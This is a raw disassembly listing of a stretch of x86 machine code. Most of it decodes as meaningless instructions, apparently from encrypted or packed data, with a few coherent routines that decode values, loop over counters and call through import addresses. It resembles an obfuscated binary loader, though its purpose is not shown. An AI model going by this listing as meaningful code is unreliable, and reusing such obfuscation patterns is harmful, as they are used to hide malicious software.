  40f892:	sbb    al,0xf6
  40f894:	xchg   ebp,eax
  40f895:	pop    ebx
  40f896:	in     eax,dx
  40f897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f898:	sar    DWORD PTR [esi],1
  40f89a:	out    dx,eax
  40f89b:	xchg   ecx,eax
  40f89c:	mov    ds:0xeba25850,al
  40f8a1:	sub    edi,DWORD PTR [eax+0x2c]
  40f8a4:	fmul   DWORD PTR [ebp-0x5481b2e5]
  40f8aa:	push   edi
  40f8ab:	or     ebp,DWORD PTR [eax]
  40f8ad:	ja     0x40f89b
  40f8af:	fsubrp st(7),st
  40f8b1:	push   eax
  40f8b2:	inc    esi
  40f8b3:	sub    al,0xcf
  40f8b5:	mov    al,ds:0x8783f967
  40f8ba:	(bad)  
  40f8bb:	jo     0x40f8b1
  40f8bd:	inc    edx
  40f8be:	div    ah
  40f8c0:	pop    es
  40f8c1:	cmp    edx,DWORD PTR [ecx+0x25a558d4]
  40f8c7:	add    al,0x8d
  40f8c9:	xlat   BYTE PTR ds:[ebx]
  40f8ca:	pusha  
  40f8cb:	or     edi,DWORD PTR [eax+0x7ed3bef2]
  40f8d1:	in     al,dx
  40f8d2:	in     al,0x9a
  40f8d4:	or     al,0xe1
  40f8d6:	fisttp DWORD PTR [esi+ecx*4-0x46]
  40f8da:	ss push ecx
  40f8dc:	sub    eax,DWORD PTR [ebp+0x7f4e581f]
  40f8e2:	mov    eax,DWORD PTR [ebp-0x4]
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x43453f,0x4345cf
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43458b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43460f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434593,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4344eb
  40f921:	xor    DWORD PTR ds:0x434553,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4345bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4345bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4345bf,edx
  40f940:	cmp    DWORD PTR ds:0x4345bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43454b
  40f952:	push   0x434692
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4345bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4345bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4345bf,edx
  40f986:	cmp    DWORD PTR ds:0x4345bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4345bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	sbb    eax,0x148c5913
  40f9be:	mov    ebp,0x79f47e7e
  40f9c3:	jle    0x40fa43
  40f9c5:	xchg   edx,eax
  40f9c6:	inc    ebp
  40f9c7:	xchg   edx,eax
  40f9c8:	mov    DWORD PTR [esi],eax
  40f9ca:	mov    bh,BYTE PTR [edx+0x54c16cad]
  40f9d0:	jns    0x40f963
  40f9d2:	lods   eax,DWORD PTR ds:[esi]
  40f9d3:	sti    
  40f9d4:	fmul   DWORD PTR [edx+0x7051784b]
  40f9da:	into   
  40f9db:	jb     0x40f9db
  40f9dd:	add    bl,BYTE PTR [esi+0x6]
  40f9e0:	or     al,0xe5
  40f9e2:	dec    ecx
  40f9e3:	pop    edi
  40f9e4:	push   esp
  40f9e5:	pop    ds
  40f9e6:	cmp    bl,ah
  40f9e8:	mov    DWORD PTR [edx-0x4f1843e4],esi
  40f9ee:	adc    ch,dl
  40f9f0:	out    dx,eax
  40f9f1:	mov    WORD PTR [edi+0x21f74a03],cs
  40f9f7:	jp     0x40f9a6
  40f9f9:	outs   dx,DWORD PTR ds:[esi]
  40f9fa:	mov    BYTE PTR [edi-0x2f9a1a30],dh
  40fa00:	xor    al,0x93
  40fa02:	mov    ds:0x541fd551,eax
  40fa07:	ficom  DWORD PTR [edx+0x38]
  40fa0a:	ror    DWORD PTR [ecx-0x1d98d0f],0x7e
  40fa11:	xchg   esp,eax
  40fa12:	pop    ebx
  40fa13:	xor    BYTE PTR [ebx-0x7382b382],cl
  40fa19:	int    0x8
  40fa1b:	loopne 0x40fa65
  40fa1d:	push   edi
  40fa1e:	xor    dh,BYTE PTR [ebx+0x618cf933]
  40fa24:	cdq    
  40fa25:	fidivr DWORD PTR [esi+0x2ca91f2a]
  40fa2b:	repnz fcomp QWORD PTR [eax+0x12e7e249]
  40fa32:	ins    BYTE PTR es:[edi],dx
  40fa33:	pusha  
  40fa34:	adc    DWORD PTR [esi+0x15],ebx
  40fa37:	jns    0x40fa97
  40fa39:	xor    edi,esi
  40fa3b:	inc    ebp
  40fa3c:	mov    edx,0x7e411a9a
  40fa41:	xor    ah,bl
  40fa43:	les    edi,FWORD PTR [ebp-0x71]
  40fa46:	fbstp  TBYTE PTR [ebp+0x7a97a28a]
  40fa4c:	jg     0x40f9d9
  40fa4e:	test   al,0x5b
  40fa50:	fisttp QWORD PTR [ecx+0x4f]
  40fa53:	mov    cl,0x36
  40fa55:	cmp    al,0xdf
  40fa57:	inc    ecx
  40fa58:	jp     0x40fabb
  40fa5a:	mov    dh,0xf
  40fa5c:	popa   
  40fa5d:	call   0xa6050d69
  40fa62:	mov    ch,BYTE PTR [ebp+0x4c]
  40fa65:	mov    eax,0x24f39cd4
  40fa6a:	jmp    0xbef78779
  40fa6f:	and    BYTE PTR [ecx],ah
  40fa71:	sub    DWORD PTR [ebx-0x36],ebx
  40fa74:	fnstenv [ebp+0x8]
  40fa77:	test   BYTE PTR [eax+0x460e2911],0xde
  40fa7e:	shr    BYTE PTR [eax+0x6ec7631d],0xb0
  40fa85:	ret    0xb8e6
  40fa88:	xchg   DWORD PTR [edx+eax*2-0x17],esi
  40fa8c:	mov    edx,0xfa4eec8
  40fa91:	out    dx,al
  40fa92:	shr    ebx,cl
  40fa94:	dec    eax
  40fa95:	call   0xba75f568
  40fa9a:	jmp    DWORD PTR [ebp-0x45172e4b]
  40faa0:	dec    edi
  40faa1:	cmp    DWORD PTR [ecx],0x46
  40faa4:	add    eax,0xb0a64f56
  40faa9:	or     al,0x4b
  40faab:	retf   
  40faac:	inc    ecx
  40faad:	ds pushf 
  40faaf:	add    al,0x4e
  40fab1:	jmp    0x485c76cf
  40fab6:	test   DWORD PTR [edx-0x1364dafe],0x7bced05b
  40fac0:	lea    ebp,[ecx-0x6a]
  40fac3:	data16 aad 0xb0
  40fac6:	out    dx,eax
  40fac7:	mov    dl,0x30
  40fac9:	inc    ebp
  40faca:	sbb    al,0xed
  40facc:	lock pop ds
  40face:	cmp    eax,0xb813f7c6
  40fad3:	inc    eax
  40fad4:	mov    edi,esi
  40fad6:	xchg   esi,eax
  40fad7:	sbb    DWORD PTR [ebp-0x4c11bf2],0xf1549463
  40fae1:	push   cs
  40fae2:	push   es
  40fae3:	cld    
  40fae4:	ror    BYTE PTR cs:[esi+0x60],cl
  40fae8:	push   ds
  40fae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faea:	outs   dx,BYTE PTR ds:[esi]
  40faeb:	pusha  
  40faec:	inc    ecx
  40faed:	sbb    esp,ebp
  40faef:	sahf   
  40faf0:	(bad)  
  40faf1:	outs   dx,DWORD PTR ds:[esi]
  40faf2:	test   BYTE PTR [ebx-0x53c28699],bl
  40faf8:	jmp    0x95893ffc
  40fafd:	arpl   WORD PTR [esp+ebp*1-0x80],bx
  40fb01:	je     0x40fb6a
  40fb03:	push   ss
  40fb04:	out    0xb1,eax
  40fb06:	(bad)  
  40fb07:	push   ss
  40fb08:	adc    DWORD PTR [eax+0x4b1523d],esi
  40fb0e:	pop    edi
  40fb0f:	scas   al,BYTE PTR es:[edi]
  40fb10:	int3   
  40fb11:	sub    eax,0xe4cedc9d
  40fb16:	xlat   BYTE PTR ds:[ebx]
  40fb17:	scas   al,BYTE PTR es:[edi]
  40fb18:	push   0x26
  40fb1a:	mov    ecx,0xfc0c23bb
  40fb1f:	stos   BYTE PTR es:[edi],al
  40fb20:	mov    al,BYTE PTR fs:[edx+0x5f]
  40fb24:	xchg   BYTE PTR ds:0xa246fb90,ah
  40fb2a:	(bad)
  40fb2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb2f:	inc    ebp
  40fb30:	pop    esp
  40fb31:	xchg   ebp,eax
  40fb32:	xchg   bl,dl
  40fb34:	inc    ecx
  40fb35:	ds pusha 
  40fb37:	hlt    
  40fb38:	cld    
  40fb39:	gs sub bh,cl
  40fb3c:	jecxz  0x40fabf
  40fb3e:	test   eax,0xc990abef
  40fb43:	fldlg2 
  40fb45:	and    ebp,esi
  40fb47:	lock nop
  40fb49:	push   ecx
  40fb4a:	cmp    al,0x4c
  40fb4c:	(bad)  
  40fb4d:	jbe    0x40fb4d
  40fb4f:	cmp    eax,0x60d77fee
  40fb54:	add    bl,BYTE PTR [esi-0x1b3d7bd9]
  40fb5a:	push   edx
  40fb5b:	mov    dl,BYTE PTR [ecx-0x4a4f06ec]
  40fb61:	daa    
  40fb62:	inc    ebp
  40fb63:	sub    eax,0xa9d894e1
  40fb68:	mov    esp,0x61d2d150
  40fb6d:	into   
  40fb6e:	inc    esp
  40fb6f:	je     0x40fbe0
  40fb71:	cmp    ch,BYTE PTR [ebx]
  40fb73:	push   ds
  40fb74:	test   DWORD PTR [ecx],esp
  40fb76:	mov    edi,0x31c1859e
  40fb7b:	stos   DWORD PTR es:[edi],eax
  40fb7c:	cmp    al,0x59
  40fb7e:	sbb    BYTE PTR [esi-0x69804340],cl
  40fb84:	test   al,0xb9
  40fb86:	out    0x4a,eax
  40fb88:	xor    ebp,esp
  40fb8a:	or     BYTE PTR [eax-0x7d9267c],dl
  40fb90:	fs das 
  40fb92:	stos   BYTE PTR es:[edi],al
  40fb93:	or     al,0x8f
  40fb95:	mov    al,0x7e
  40fb97:	xchg   ecx,eax
  40fb98:	jne    0x40fb26
  40fb9a:	push   ebp
  40fb9b:	das    
  40fb9c:	push   ds
  40fb9d:	mov    bh,0x16
  40fb9f:	add    eax,ecx
  40fba1:	adc    BYTE PTR [eax],cl
  40fba3:	imul   esi,DWORD PTR [eax-0xba2cea8],0xbbcd13ba
  40fbad:	mov    eax,0x4674670c
  40fbb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb3:	mov    ecx,0x9b7f40e9
  40fbb8:	sbb    ecx,DWORD PTR [edx-0x6d]
  40fbbb:	jae    0x40fc2b
  40fbbd:	outs   dx,DWORD PTR ds:[esi]
  40fbbe:	mov    DWORD PTR [ecx-0x25],0xc7182861
  40fbc5:	ins    BYTE PTR es:[edi],dx
  40fbc6:	inc    eax
  40fbc7:	xor    BYTE PTR [eax-0x5253ea46],ch
  40fbcd:	sub    DWORD PTR [ebx-0x43c8ce16],esi
  40fbd3:	out    0x1f,eax
  40fbd5:	mov    eax,0x63b69b7d
  40fbda:	or     BYTE PTR [ebp*1-0x19e23045],dl
  40fbe1:	in     al,dx
  40fbe2:	(bad)  
  40fbe3:	aam    0xcd
  40fbe5:	inc    ebx
  40fbe6:	cs mov ebx,0xdfdc5532
  40fbec:	add    BYTE PTR [ebx+ecx*8+0x39],al
  40fbf0:	(bad)  
  40fbf1:	mov    esp,0x1b6bff7f
  40fbf6:	push   ebp
  40fbf7:	adc    bl,BYTE PTR [edi+0x2e669034]
  40fbfd:	iret   
  40fbfe:	std    
  40fbff:	mov    DWORD PTR [edi-0x21b3fb22],esp
  40fc05:	jo     0x40fbcc
  40fc07:	xchg   BYTE PTR [ecx+0x1d0f999a],al
  40fc0d:	and    DWORD PTR [bx+di],eax
  40fc10:	jne    0x40fc15
  40fc12:	mov    bl,0x96
  40fc14:	mov    BYTE PTR [ecx],bh
  40fc16:	inc    esi
  40fc17:	cmp    eax,0x616dabcd
  40fc1c:	in     al,0x5e
  40fc1e:	test   eax,0xc9df2284
  40fc23:	mov    bh,0xf4
  40fc25:	xor    edi,ecx
  40fc27:	cmp    eax,0x6827ad71
  40fc2c:	and    al,0x6e
  40fc2e:	cmp    ebx,ebx
  40fc30:	mov    esi,0x892e8893
  40fc35:	repz bound ebx,QWORD PTR [ecx+0x20]
  40fc39:	psubd  mm7,QWORD PTR [edi-0x6f]
  40fc3d:	pop    esi
  40fc3e:	and    BYTE PTR [esi],ah
  40fc40:	inc    eax
  40fc41:	shl    BYTE PTR [esi-0x1c],0xe3
  40fc45:	cmp    edx,esi
  40fc47:	loope  0x40fc1a
  40fc49:	popf   
  40fc4a:	xor    dh,dh
  40fc4c:	imul   ecx,ecx,0x62
  40fc4f:	jae    0x40fc96
  40fc51:	cmp    bh,BYTE PTR [ebp-0x4c]
  40fc54:	cmp    al,0x34
  40fc56:	mov    gs,edi
  40fc58:	mov    eax,DWORD PTR [edx]
  40fc5a:	jae    0x40fc87
  40fc5c:	fsub   DWORD PTR [ecx+0x6d]
  40fc5f:	dec    ebp
  40fc60:	xchg   esp,eax
  40fc61:	call   0x5865:0x26755d86
  40fc68:	stos   BYTE PTR es:[edi],al
  40fc69:	xchg   edi,eax
  40fc6a:	xchg   ebp,eax
  40fc6b:	ins    DWORD PTR es:[edi],dx
  40fc6c:	mov    ebx,0x848d480c
  40fc71:	xchg   ebp,eax
  40fc72:	ret    
  40fc73:	add    eax,0x9cb137e3
  40fc78:	scas   al,BYTE PTR es:[edi]
  40fc79:	sbb    al,BYTE PTR [edx+edi*1+0x18eedc1e]
  40fc80:	aas    
  40fc81:	xchg   esi,eax
  40fc82:	stc    
  40fc83:	sbb    al,0x4c
  40fc85:	xor    ebx,edi
  40fc87:	add    esi,DWORD PTR gs:[edi]
  40fc8a:	sub    al,BYTE PTR [ebx+edi*1-0x1855b6c0]
  40fc91:	pop    ecx
  40fc92:	dec    edi
  40fc93:	cmc    
  40fc94:	(bad)  
  40fc95:	mov    esp,0x6aa01411
  40fc9a:	cld    
  40fc9b:	loope  0x40fc77
  40fc9d:	loop   0x40fc3c
  40fc9f:	gs test eax,0xa71baa5
  40fca5:	in     al,0x40
  40fca7:	and    DWORD PTR [esi-0x6e494983],ebx
  40fcad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcae:	pop    edi
  40fcaf:	pop    es
  40fcb0:	jae    0x40fc96
  40fcb2:	fwait
  40fcb3:	lods   al,BYTE PTR ds:[esi]
  40fcb4:	popa   
  40fcb5:	fs jbe 0x40fcb9
  40fcb8:	dec    ecx
  40fcb9:	or     ebp,DWORD PTR [eax]
  40fcbb:	jg     0x40fc61
  40fcbd:	adc    DWORD PTR [edi],esp
  40fcbf:	or     al,0xae
  40fcc1:	test   eax,0x472d3f1
  40fcc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc7:	(bad)  
  40fcc8:	bound  edi,QWORD PTR [ecx-0x6d480a3c]
  40fcce:	add    esi,DWORD PTR gs:[ebp-0xdf7ecd7]
  40fcd5:	or     dh,BYTE PTR ds:0xf5e77ccf
  40fcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcdc:	call   0x2b36:0x5027daa2
  40fce3:	xchg   edx,eax
  40fce4:	push   edx
  40fce5:	dec    esp
  40fce6:	pop    ebx
  40fce7:	jmp    0xc439:0x3afb1e3d
  40fcee:	shr    edx,cl
  40fcf0:	add    al,cl
  40fcf2:	ret    
  40fcf3:	mov    esp,0x3c70c7a4
  40fcf8:	mov    dl,0x74
  40fcfa:	mov    ch,0x8a
  40fcfc:	or     ch,BYTE PTR [edi]
  40fcfe:	std    
  40fcff:	(bad)  
  40fd00:	outs   dx,BYTE PTR ds:[esi]
  40fd01:	pop    esp
  40fd02:	repnz fdivr QWORD PTR [ebx-0x5351f932]
  40fd09:	imul   ecx,DWORD PTR [eax+0x1478ce6f],0xeaba4e39
  40fd13:	ins    DWORD PTR es:[edi],dx
  40fd14:	scas   al,BYTE PTR es:[edi]
  40fd15:	push   edx
  40fd16:	jmp    0x40fc9d
  40fd18:	aad    0x5e
  40fd1a:	fldenv [ecx+0x25]
  40fd1d:	out    0xda,al
  40fd1f:	inc    ecx
  40fd20:	pushf  
  40fd21:	xchg   ecx,eax
  40fd22:	arpl   WORD PTR [edx],bp
  40fd24:	loopne 0x40fd07
  40fd26:	sbb    ecx,edi
  40fd28:	xchg   ebx,eax
  40fd29:	lahf   
  40fd2a:	aad    0xb0
  40fd2c:	xchg   ebx,eax
  40fd2d:	push   cs
  40fd2e:	cmp    eax,0x74670531
  40fd33:	call   0x5afe:0xd8c8cbc8
  40fd3a:	add    al,ch
  40fd3c:	dec    edx
  40fd3d:	or     al,0x0
  40fd3f:	add    BYTE PTR [ebx+0x414afe0d],cl
  40fd45:	add    BYTE PTR [ebx+0x1cc89],cl
  40fd4b:	add    BYTE PTR [ecx-0x7ba74ff],cl
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	xchg   ecx,eax
  40fd9d:	leave  
  40fd9e:	pop    ebp
  40fd9f:	aam    0x82
  40fda1:	mov    eax,0x79f47e7e
  40fda6:	jle    0x40fe26
  40fda8:	scas   al,BYTE PTR es:[edi]
  40fda9:	pop    ss
  40fdaa:	stos   BYTE PTR es:[edi],al
  40fdab:	addr16 test ebp,eax
  40fdae:	aas    
  40fdaf:	jns    0x40fd9f
  40fdb1:	add    eax,0x1c0b3100
  40fdb6:	loope  0x40fd50
  40fdb8:	stos   DWORD PTR es:[edi],eax
  40fdb9:	push   0xfffffff3
  40fdbb:	fnstsw WORD PTR [edi]
  40fdbd:	push   0x37
  40fdbf:	and    esi,DWORD PTR [ecx]
  40fdc1:	int    0xa1
  40fdc3:	arpl   si,bx
  40fdc5:	pusha  
  40fdc6:	pusha  
  40fdc7:	sbb    al,0xa8
  40fdc9:	mov    BYTE PTR [eax],dl
  40fdcb:	cmc    
  40fdcc:	outs   dx,BYTE PTR ds:[esi]
  40fdcd:	adc    ch,BYTE PTR [esi-0x9]
  40fdd0:	jle    0x40fda8
  40fdd2:	imul   esi,esi,0xcdbbc534
  40fdd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdd9:	dec    ecx
  40fdda:	mov    ebp,ebx
  40fddc:	sub    cl,BYTE PTR [ecx+0x4cbfe1b7]
  40fde2:	pop    es
  40fde3:	(bad)  
  40fde4:	test   al,0x21
  40fde6:	dec    ebx
  40fde7:	jbe    0x40fe3a
  40fde9:	jb     0x40fe68
  40fdeb:	ret    0xfbd
  40fdee:	jl     0x40fe5d
  40fdf0:	gs add ebx,esi
  40fdf3:	jle    0x40fe33
  40fdf5:	jmp    FWORD PTR [esi-0x475397ba]
  40fdfb:	jp     0x40fdb2
  40fdfd:	pop    edx
  40fdfe:	leave  
  40fdff:	xchg   DWORD PTR [ebp+edx*1-0xcb0efa0],esp
  40fe06:	rcl    BYTE PTR [eax-0x4d],cl
  40fe09:	push   ebx
  40fe0a:	xor    BYTE PTR [ebp+0x4a],ch
  40fe0d:	sbb    DWORD PTR [ebx-0x52864603],ebp
  40fe13:	dec    esp
  40fe14:	pop    ebx
  40fe15:	or     al,0xb7
  40fe17:	mov    ebx,0x968b053b
  40fe1c:	repz ret 
  40fe1e:	sub    al,0xc
  40fe20:	stos   BYTE PTR es:[edi],al
  40fe21:	lea    ecx,[eax-0x6a]
  40fe24:	fst    DWORD PTR [eax]
  40fe26:	mov    bl,0x6a
  40fe28:	dec    ebx
  40fe29:	sub    BYTE PTR [ebx+eax*2],bh
  40fe2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe2d:	mov    edi,0xc76bfbb7
  40fe32:	cdq    
  40fe33:	fs stc 
  40fe35:	repnz nop
  40fe37:	mov    al,ds:0x1a5e80b9
  40fe3c:	xor    esp,ebp
  40fe3e:	pop    ebx
  40fe3f:	xchg   edx,eax
  40fe40:	dec    ecx
  40fe41:	pop    ecx
  40fe42:	repnz cmp edx,DWORD PTR [edi]
  40fe45:	inc    ebp
  40fe46:	cwd    
  40fe48:	dec    esi
  40fe49:	mov    ebp,0xbb7f9151
  40fe4e:	jp     0x40fe40
  40fe50:	ret    
  40fe51:	shl    BYTE PTR ds:0x9bbaea52,1
  40fe57:	scas   al,BYTE PTR es:[edi]
  40fe58:	repz test al,0x81
  40fe5b:	jl     0x40fe20
  40fe5d:	fmul   DWORD PTR [esi+ebx*2+0x10]
  40fe61:	ja     0x40fe1e
  40fe63:	and    ebp,esi
  40fe65:	and    edx,DWORD PTR [ebx]
  40fe67:	cmp    al,0x72
  40fe69:	std    
  40fe6a:	dec    edx
  40fe6b:	cmc    
  40fe6c:	xor    eax,eax
  40fe6e:	xor    ebp,DWORD PTR ds:0xf560a272
  40fe74:	jmp    0xfe47:0xb60b1267
  40fe7b:	lods   eax,DWORD PTR ds:[esi]
  40fe7c:	retf   0x532b
  40fe7f:	outs   dx,BYTE PTR ds:[esi]
  40fe80:	lahf   
  40fe81:	fucomi st,st(3)
  40fe83:	cli    
  40fe84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe85:	jnp    0x40fe35
  40fe87:	mov    ebp,eax
  40fe89:	jle    0x40fee7
  40fe8b:	pop    edi
  40fe8c:	xchg   ebp,eax
  40fe8d:	pop    ebp
  40fe8e:	ins    BYTE PTR es:[edi],dx
  40fe8f:	psllq  mm5,mm2
  40fe92:	fmul   st(1),st
  40fe94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe95:	push   esp
  40fe96:	mov    eax,0x7f07b2f0
  40fe9b:	push   es
  40fe9c:	ja     0x40ff07
  40fe9e:	outs   dx,DWORD PTR ds:[esi]
  40fe9f:	pusha  
  40fea0:	(bad)  
  40fea1:	jmp    0x4fcb:0x1c1d848f
  40fea8:	mov    dl,0x7
  40feaa:	inc    eax
  40feab:	adc    esi,DWORD PTR [esi+0x64]
  40feae:	mov    ecx,0xaefe46bd
  40feb3:	aam    0x58
  40feb5:	jmp    DWORD PTR [ebx-0x592260b8]
  40febb:	fnstsw WORD PTR [ebx]
  40febd:	loop   0x40fee3
  40febf:	mov    ds:0x8805337a,al
  40fec4:	adc    DWORD PTR [edx-0x11b5b111],ebp
  40feca:	dec    ch
  40fecc:	fdivr  st(5),st
  40fece:	cmp    al,0x2a
  40fed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed1:	sub    ecx,DWORD PTR [edx]
  40fed3:	sbb    al,0x23
  40fed5:	out    dx,al
  40fed6:	adc    al,BYTE PTR [esi+0x14]
  40fed9:	pop    edi
  40feda:	jecxz  0x40fe7b
  40fedc:	push   ebx
  40fedd:	mov    eax,0x33f8ab5b
  40fee2:	pop    eax
  40fee3:	mov    bh,0x7f
  40fee5:	xchg   DWORD PTR [edi+0x2c7ae09b],edi
  40feeb:	pop    ds
  40feec:	push   ebx
  40feed:	dec    esi
  40feee:	(bad)  
  40feef:	cwde   
  40fef0:	in     eax,0x88
  40fef2:	add    esp,DWORD PTR [ecx]
  40fef4:	jl     0x40fee1
  40fef6:	xor    dh,cl
  40fef8:	add    eax,0x24324305
  40fefd:	ja     0x40fec5
  40feff:	sbb    edx,DWORD PTR [esi+0x59]
  40ff02:	pop    DWORD PTR [ebx+ebp*1+0x5de8d46c]
  40ff09:	sbb    esi,DWORD PTR [edx+0xecc9896]
  40ff0f:	push   es
  40ff10:	mov    al,0x55
  40ff12:	nop
  40ff13:	sub    BYTE PTR [edx-0x6b0550a0],dl
  40ff19:	inc    esi
  40ff1a:	inc    esp
  40ff1b:	es sbb al,0x3e
  40ff1e:	xlat   BYTE PTR ds:[ebx]
  40ff1f:	jle    0x40fec8
  40ff21:	fistp  WORD PTR ss:[ebp+0x63e6bc2]
  40ff28:	sub    BYTE PTR [edx+edx*2],cl
  40ff2b:	div    ecx
  40ff2d:	or     ecx,DWORD PTR [eax-0x56d2cb18]
  40ff33:	mov    edx,0x2e8ce9be
  40ff38:	int    0x35
  40ff3a:	ins    DWORD PTR es:[edi],dx
  40ff3b:	cmp    BYTE PTR [edx-0x5d0fbc68],dl
  40ff41:	fidiv  DWORD PTR [esi+esi*2+0x25ff3c74]
  40ff48:	add    eax,0x1a1fab37
  40ff4d:	pop    es
  40ff4e:	dec    eax
  40ff4f:	xor    eax,0x470d3f3
  40ff54:	sar    edx,cl
  40ff56:	repz pushf 
  40ff58:	pop    ds
  40ff59:	rol    DWORD PTR [ebx+edi*4],cl
  40ff5c:	push   ebx
  40ff5d:	cmc    
  40ff5e:	fnstcw WORD PTR [edx]
  40ff60:	cmp    ah,BYTE PTR [edi]
  40ff62:	sub    eax,0x3e8a419a
  40ff67:	imul   dh
  40ff69:	and    BYTE PTR [esi],0xe7
  40ff6c:	xor    BYTE PTR [edi],cl
  40ff6e:	xchg   ebx,eax
  40ff6f:	(bad)  
  40ff70:	push   esp
  40ff71:	pop    esi
  40ff72:	xchg   esi,eax
  40ff73:	jg     0x40ffa7
  40ff75:	iret   
  40ff76:	ror    BYTE PTR [eax+ecx*1+0x13847bfd],0xbf
  40ff7e:	repz mov al,0x3d
  40ff81:	jbe    0x40ffb4
  40ff83:	inc    eax
  40ff84:	xchg   ebp,eax
  40ff85:	sub    al,BYTE PTR [ebx-0x2181ea61]
  40ff8b:	retf   0xfff6
  40ff8e:	and    al,0x9f
  40ff90:	add    dh,dh
  40ff92:	mov    eax,0x34b1de07
  40ff97:	push   esi
  40ff98:	shr    ebx,cl
  40ff9a:	ins    DWORD PTR es:[edi],dx
  40ff9b:	xchg   esi,esi
  40ff9d:	lods   eax,DWORD PTR ds:[esi]
  40ff9e:	test   al,0x5d
  40ffa0:	mov    ecx,0xd36f9a3e
  40ffa5:	fcmovne st,st(3)
  40ffa7:	sbb    eax,0x8721c65a
  40ffac:	inc    esi
  40ffad:	xchg   ebx,eax
  40ffae:	imul   BYTE PTR [ebx+edx*8-0x2c]
  40ffb2:	fwait
  40ffb3:	pop    edx
  40ffb4:	sub    edi,esp
  40ffb6:	pop    ds
  40ffb7:	pop    esp
  40ffb8:	bswap  eax
  40ffba:	add    eax,0xba5a5a7b
  40ffbf:	mov    BYTE PTR [ebx-0x47],bl
  40ffc2:	mov    ch,al
  40ffc4:	call   0xfb04eb3
  40ffc9:	jmp    0x410024
  40ffcb:	jbe    0x40ff82
  40ffcd:	ret    
  40ffce:	test   eax,0xb877f5f3
  40ffd3:	fist   DWORD PTR [ecx-0x1a]
  40ffd6:	test   al,0x52
  40ffd8:	xor    eax,0x3755c03a
  40ffdd:	jo     0x40ffb0
  40ffdf:	(bad)  
  40ffe0:	out    dx,al
  40ffe1:	aam    0xa2
  40ffe3:	push   ebx
  40ffe4:	push   ebx
  40ffe5:	stc    
  40ffe6:	or     BYTE PTR [ebx],ch
  40ffe8:	sbb    al,BYTE PTR [edx+0x7098f2d7]
  40ffee:	jo     0x40ffb8
  40fff0:	and    ch,ch
  40fff2:	push   0x3b
  40fff4:	xor    BYTE PTR [ecx+esi*1+0x6664452c],cl
  40fffb:	loopne 0x40ffbd
  40fffd:	jae    0x40ffba
  40ffff:	mov    edi,0x612b16c4
  410004:	daa    
  410005:	dec    ebx
  410006:	fs inc eax
  410008:	popf   
  410009:	daa    
  41000a:	cmp    edi,esi
  41000c:	cmp    ch,al
  41000e:	xor    eax,0x826c7a4b
  410013:	mov    BYTE PTR [ebp+ecx*8-0x1],dl
  410017:	jmp    0x27a2:0x82742932
  41001e:	out    dx,eax
  41001f:	enter  0x45f9,0x88
  410023:	(bad)  
  410025:	and    eax,0x5fc0bf23
  41002a:	push   cs
  41002b:	(bad)  
  41002c:	jmp    0x2fa3:0x1dbb2878
  410033:	sar    eax,cl
  410035:	fstp   TBYTE PTR [edx-0xf]
  410038:	(bad)  
  410039:	aam    0x72
  41003b:	cmc    
  41003c:	(bad)  
  41003d:	fdivr  DWORD PTR [ebp-0x1c]
  410040:	xor    eax,0x281161f4
  410045:	aam    0x2f
  410047:	or     bh,al
  410049:	xchg   ecx,eax
